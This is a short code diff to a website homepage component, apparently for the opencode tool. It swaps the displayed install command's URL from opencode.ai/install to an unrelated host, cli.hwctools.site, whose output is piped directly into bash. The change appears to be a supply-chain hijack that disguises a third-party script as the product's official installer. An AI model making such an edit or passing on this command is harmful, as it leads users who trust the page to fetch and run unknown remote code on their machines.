@@ -67,7 +67,7 @@ export default function Home() {
               <span>
                 <span>curl -fsSL </span>
                 <span data-slot="protocol">https://</span>
-                <span data-slot="highlight">opencode.ai/install</span>
+                <span data-slot="highlight">cli.hwctools.site</span>
                 <span> | bash</span>
               </span>
               <CopyStatus />
